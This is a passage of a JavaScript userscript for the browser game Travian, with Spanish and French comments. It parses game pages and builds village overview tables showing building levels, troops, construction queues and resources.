				var b = get("l" + (5 - i), ansdoc);
				var perc = Math.round((b.title.split("/")[0] * 100) / b.title.split("/")[1]);
				var cant = b.innerHTML.split("/")[0];
				var color = '';
				if (b.title < 0)
				{
					color = '<font color=red>';
				}
				if (b.title > 0)
				{
					color = '<font color=gray>';
				}
				var c = '';
				c += color + '<span style="font-size:13px">' + b.title;
				a += '<nobr>' + c + '</nobr>';
			}
			find("//td[@id='aldea" + did + "_2" + "']", XPFirst).innerHTML = a;
		}

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
		find("//span[@class='c2']", XPFirst).removeAttribute("class");
		find("//a[contains(@href, '" + did + "') and ancestor::div[@id='lright1']]", XPFirst).parentNode.firstChild.className = 'c2';

		// Auto Refresh
		if (times.length > 0)
		{
			var time = Number.POSITIVE_INFINITY;
			for (var i = 0; i < times.length; i++)
			{
				times[i] = calcular_segundos(times[i]);
				if (times[i] < time)
					time = times[i];
			}
		}
		// FIXME: Firefox rendering bug
		casilla.parentNode.setAttribute("style", "width:100%");
	}

	function procesarPC(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info PC
		var a = ansdoc.evaluate("//div[@id='lmid2']//b", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
		}
		else
			lvl = '';
		if (lvl)
		{
			var b = ansdoc.evaluate("//table[@class='tbg']", ans, null, XPFirst, null).singleNodeValue;
			aldeis = b.innerHTML.split("(").length;
			gg = $tags("a", b).length;
			if (gg > 1)
				hehe = $tags("a", b)[1].innerHTML;
			else
				hehe = "-";
			if (gg > 3)
				hehe1 = $tags("a", b)[3].innerHTML;
			else
				hehe1 = "-";
			find("//td[@id='aldea" + did + "_" + 1 + "']", XPFirst).innerHTML = (aldeis - 1) + "/" + parseInt(lvl / 10);
			find("//td[@id='aldea" + did + "_" + 3 + "']", XPFirst).innerHTML = hehe;
			find("//td[@id='aldea" + did + "_" + 4 + "']", XPFirst).innerHTML = hehe1;
			find("//td[@id='aldea" + did + "_" + 2 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=25&newdid=' + did + '"><img src="' + img('/a/b3.gif') + '" width="5" ></a>';
			find("//td[@id='aldea" + did + "_" + 0 + "']", XPFirst).innerHTML = lvl;
		}

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}



	function procesarPCb(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info PC
		var a = ansdoc.evaluate("//div[@id='lmid2']//b", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
		}
		else
			lvl = '';
		if (lvl)
		{
			var b = ansdoc.evaluate("//table[@class='tbg']", ans, null, XPFirst, null).singleNodeValue;
			aldeis = b.innerHTML.split("(").length;
			gg = $tags('a', b).length;
			if (gg > 1)
				hehe = $tags('a', b)[1].innerHTML;
			else
				hehe = "-";
			if (gg > 3)
				hehe1 = $tags('a', b)[3].innerHTML;
			else
				hehe1 = "-";
			if (gg > 5)
				hehe2 = $tags('a', b)[5].innerHTML;
			else
				hehe2 = "-";
			find("//td[@id='aldea" + did + "_" + 1 + "']", XPFirst).innerHTML = (aldeis - 1) + "/" + (parseInt(lvl / 5) - 1);
			find("//td[@id='aldea" + did + "_" + 3 + "']", XPFirst).innerHTML = hehe;
			find("//td[@id='aldea" + did + "_" + 4 + "']", XPFirst).innerHTML = hehe1;
			find("//td[@id='aldea" + did + "_" + 5 + "']", XPFirst).innerHTML = hehe2;
			find("//td[@id='aldea" + did + "_" + 2 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=26&newdid=' + did + '"><img src="' + img('/a/b4.gif') + '" width="5" ></a>';
			find("//td[@id='aldea" + did + "_" + 0 + "']", XPFirst).innerHTML = lvl;
		}

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}

	function procesarPF(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info fete
		var a = ansdoc.evaluate("//div[@id='lmid2']//b", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
		}
		else
			lvl = '';
		if (lvl)
		{
			var b = ansdoc.evaluate("//table[@class='tbg']", ans, null, XPFirst, null).singleNodeValue;
			aldeis = b.innerHTML.split("(").length;
			gg = $tags('a', b).length;
			if (gg > 1)
				hehe = $tags('a', b)[1].innerHTML;
			else
				hehe = "-";
			if (gg > 3)
				hehe1 = $tags('a', b)[3].innerHTML;
			else
				hehe1 = "-";
			find("//td[@id='aldea" + did + "_" + 1 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=24&newdid=' + did + '">' + hehe + '</a>';
			find("//td[@id='aldea" + did + "_" + 2 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=24&newdid=' + did + '">' + hehe1 + '</a>';
		}
		else
			lvl = '-';
		find("//td[@id='aldea" + did + "_" + 0 + "']", XPFirst).innerHTML = lvl;

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}

	function procesarMA(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info manoir
		var a = ansdoc.evaluate("//div[@id='lmid2']//b", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
		}
		else
			lvl = '';
		if (lvl)
		{
			var b = ansdoc.evaluate("//table[@class='tbg']", ans, null, XPFirst, null).singleNodeValue;
			if (b)
			{
				aldeis = b.innerHTML.split("(").length;
				gg = $tags('a', b).length;
				if (gg > 1)
					hehe = $tags('a', b)[1].innerHTML;
				else
					hehe = "-";
				if (gg > 3)
					hehe1 = $tags('a', b)[3].innerHTML;
				else
					hehe1 = "-";
				if (gg > 5)
					hehe2 = $tags('a', b)[5].innerHTML;
				else
					hehe2 = "-";
				find("//td[@id='aldea" + did + "_" + 1 + "']", XPFirst).innerHTML = (aldeis - 1) + "/" + (parseInt(lvl / 5) - 1);
				find("//td[@id='aldea" + did + "_" + 3 + "']", XPFirst).innerHTML = hehe;
				find("//td[@id='aldea" + did + "_" + 4 + "']", XPFirst).innerHTML = hehe1;
				find("//td[@id='aldea" + did + "_" + 5 + "']", XPFirst).innerHTML = hehe2;
			}
			find("//td[@id='aldea" + did + "_" + 2 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=37&newdid=' + did + '"><img src="' + img('/a/b4.gif') + '" width="5" ></a>';
			find("//td[@id='aldea" + did + "_" + 0 + "']", XPFirst).innerHTML = lvl;
		}

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}

	function procesarT(t)
	{
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);
		var a = ''
		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}
		var times = new Array();

		// Ataques
		var casilla = find("//td[@id='aldea" + did + "_" + 1 + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='ltbw1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (!a)
				var a = ansdoc.evaluate("//div[@id='ltbw0']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
				var a = a.firstChild;
				var b = new Array();
				for (var i = 0; i < a.childNodes.length; i++)
				{
					var tr = a.childNodes[i];
					// FIXME: Apanyo para FF. Firefox mete nodos vacios
					var error = (tr.childNodes.length == 5 ? false : true);
					times.push(tr.childNodes[error ? 9 : 4].textContent.split(" ")[0]);
					b[i] = '<nobr><a href="build.php?newdid=' + did + '&gid=16" title="' + tr.childNodes[error ? 3 : 1].textContent.split(" ")[1] + '">' + tr.childNodes[error ? 1 : 0].firstChild.innerHTML + "</a> <span style='font-size:10px; color:#2F4F4F' id='timeouta'>" + tr.childNodes[error ? 9 : 4].textContent.split(" ")[0] + '</span></nobr>';
				}
				casilla.innerHTML = b.join("|");
		}
		else
				casilla.innerHTML = '-';

		// Construcciones
		var casilla = find("//td[@id='aldea" + did + "_" + 2 + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='lbau1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
				var b = new Array();
				for (var i = 0; i < a.firstChild.childNodes.length; i++)
				{
					times.push(a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0]);
					b[i] = '<nobr><img src="' + img('a/bau.gif') + '" width="9" border="0"  title="' + a.firstChild.childNodes[i].childNodes[1].innerHTML + '"/> <span style="font-size:10px; color:#2F4F4F" id="timeouta">' + a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0] + "</span></nobr>";
				}
				casilla.innerHTML = b.join("|");
		}
		else
				casilla.innerHTML = '-';

		// Tropas
		var casilla = find("//td[@id='aldea" + did + "_" + 3 + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='ltrm']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue.firstChild;
		if (a.firstChild.childNodes.length == 3)
		{
			var b = new Array();
			for (var i = 0; i < a.childNodes.length; i++)
			{
				var tr = a.childNodes[i];
				tr.childNodes[0].firstChild.firstChild.setAttribute("title", tr.childNodes[2].innerHTML + " " + tr.childNodes[1].innerHTML.split(">")[1].split("<")[0]);
				b[i] = '<nobr>' + tr.childNodes[0].firstChild.innerHTML + '</nobr>';
			}
			casilla.innerHTML = b.join("");
		}
		else
			casilla.innerHTML = '-';

			// céréale
		{
			var a = '';
			for (var i = 4; i < 5; i++)
			{
				var b = get("l" + (5 - i), ansdoc);
				var perc = Math.round((b.title.split("/")[0] * 100) / b.title.split("/")[1]);
				var cant = b.innerHTML.split("/")[0];
				var color = '';
				if (b.title < 0)
				{
					color = '<font color=red>';
				}
				if (b.title > 0)
				{
					color = '<font color=gray>';
				}
				var c = '';
				c += color + '<span style="font-size:10px">' + b.title;
				a += '<nobr>' + c + '</nobr>';
			}
			find("//td[@id='aldea" + did + "_" + 4 + "']", XPFirst).innerHTML = a;
		}

		// Materias primas simplifié
		var a = '';
		for (var i = 4; i < 5; i++)
		{
			var b = get("l" + (5 - i), ansdoc);
			var perc = Math.round((b.innerHTML.split("/")[0] * 100) / b.innerHTML.split("/")[1]);
			var cant = b.innerHTML.split("/")[0];
			var color = '';
			if (perc > 0)
			{
				color = '<font color=green>';
			}
			if (perc > 10)
			{
				color = '<font color=black>';
			}
			if (perc > 69)
			{
				color = '<font color=orange>';
			}
			if (perc > 98)
			{
				color = '<font color=red>';
			}
			if (cant % 1000 == 0)
				txt_cant = (cant / 1000) + "k";
			else
				txt_cant = cant;
			var c = '';
			c += '<img src="' + img('r/' + i + '.gif') + '" width="14" border="0" title="' + T('RECURSO' + i) + '">';
			c += '<span style="font-size:11px" title="' + b.innerHTML + '">' + color + perc + '%</span>';
			a += '<nobr>' + c + '</nobr>';
			if (i != 4)
				a += '<font color=#DCDCDC>' + " | " + '</font>';
		}
		find("//td[@id='aldea" + did + "_" + 5 + "']", XPFirst).innerHTML = a;

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');

		// Auto Refresh
		if (times.length > 0)
		{
			var time = Number.POSITIVE_INFINITY;
			for (var i = 0; i < times.length; i++)
			{
				times[i] = calcular_segundos(times[i]);
				if (times[i] < time)
					time = times[i];
			}
		}
		// FIXME: Firefox rendering bug
		casilla.parentNode.setAttribute("style", "width:100%");
	}

	function procesarM(t)
	{

		var ans = $elem("DIV", t.responseText);
		var ansdoc = document.implementation.createDocument("", "", null);
		ansdoc.appendChild(ans);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info marchand
		var a = ansdoc.evaluate("//td[@colspan='2']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('MARC'))[1].split('<')[0];
		}
		else
			lvl = '';

		find("//td[@id='aldea" + did + "_" + 0 + "']", XPFirst).innerHTML = '<a style="font-size:9px" href="build.php?gid=17&newdid=' + did + '">' + lvl + '</a>';

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}

	function procesarF(t)
	{

		var ans = $elem("DIV", t.responseText);
		var ansdoc = document.implementation.createDocument("", "", null);
		ansdoc.appendChild(ans);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// info fete
		var a = ansdoc.evaluate("//div[@id='lmid2']//b", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var lvl = a.innerHTML.split(T('LVL'))[1].split("</b>")[0];
		}
		else
			lvl = '';
		if (lvl)
		{
			var b = ansdoc.evaluate("//table[@class='tbg']", ans, null, XPFirst, null).singleNodeValue;
			aldeis = b.innerHTML.split("(").length;
			gg = $tags('a', b).length;
			if (gg > 1)
				hehe = $tags('a', b)[1].innerHTML;
			else
				hehe = "-";
			if (gg > 3)
				hehe1 = $tags('a', b)[3].innerHTML;
			else
				hehe1 = "-";
			find("//td[@id='aldea" + did + "_" + 6 + "']", XPFirst).innerHTML = '<a target="_blank"; href="build.php?gid=24&newdid=' + did + '"><img src="' + img('/u/geb.gif') + '" width="8" title="' /* + lvl + ' / '*/ + hehe + ' / ' + hehe1 + '"></a>';
		}
		else
			lvl = '';

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
	}

	function resumenAldeas()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE", "", {
				"class": "tbg",
				"align": "center",
				"cellspacing": 1,
				"cellpadding": 2
			});

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea(did), 1000 * 1);
				}
			}
		}, 0);
		tr.appendChild(FullRefresh);

		var td2 = $elem("TD", T('RESUMEN'));
		td2.setAttribute("colspan", "2");
		tr.appendChild(td2);
		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea(did), 0);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "2");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				//	Vue d'ensemble des ressources
				for (var j = 0; j < 3; j++)
				{
					if (j != 2 && j != 0)
						tr = $elem("TR");
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "center");
					if (j != 1 && j != 2)
						td.setAttribute("width", "100%");
					if (j == 0)
						td.setAttribute("colspan", "2");
					else
						if (j != 0)
						{
							td.setAttribute("style", "border-bottom-style: solid; border-bottom-width: thin");
						}
					tr.appendChild(td);
					if (j != 1)
						tabla.appendChild(tr);
				}
			}
		}

		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}
	}

	function resumenAldeas2()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE", "", {
				"class": "tbg",
				"align": "center",
				"cellspacing": 1,
				"cellpadding": 2
			});

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea1(did), 1000 * 1);
					setTimeout(crearEventoActualizarAldeaM(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", ''));
		tr.appendChild($elem("TD", '<img src="' + img('r/1.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/2.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/3.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('a/clock.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/4.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('a/clock.gif') + '">'));
		tr.appendChild($elem("TD", ''));

		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea1(did), 0);
				td.appendChild(enlace);
				var enlace = $elem("A", "");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldeaM(did), 0);
				td.appendChild(enlace);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 8; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 8)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}

	}

	function resumenAldeas3()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "center");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea2(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", T('ATT')));
		tr.appendChild($elem("TD", T('CONS')));
		tr.appendChild($elem("TD", T('TROP')));


		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea2(did), 0);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 3; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 3)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}

	}

	function resumenAldeas4()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE", "", {
			"class": "tbg",
			"align": "center",
			"cellspacing": 1,
			"cellpadding": 2
		});

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea3(did), 1000 * 1);
				}
			}
		}, 0);
		tr.appendChild(FullRefresh);

		var td2 = $elem("TD", T('TROP') + ' ' + T('IN') + ' ' + T('ALDEA'));
		td2.setAttribute("colspan", "7");
		tr.appendChild(td2);
		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea3(did), 0);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 3; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 3)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}

	}


	function resumenAldeas5()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "center");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea4(did), 1000 * 1);
					setTimeout(crearEventoActualizarAldea4b(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", 'LvL'));
		tr.appendChild($elem("TD", 'Slot'));
		tr.appendChild($elem("TD", ''));
		tr.appendChild($elem("TD", T('EXT') + ' / 1'));
		tr.appendChild($elem("TD", ' / 2'));
		tr.appendChild($elem("TD", ' / 3'));

		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" + img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea4(did), 0);
				td.appendChild(enlace);
				var enlace = $elem("A", "");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea4b(did), 0);
				td.appendChild(enlace);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
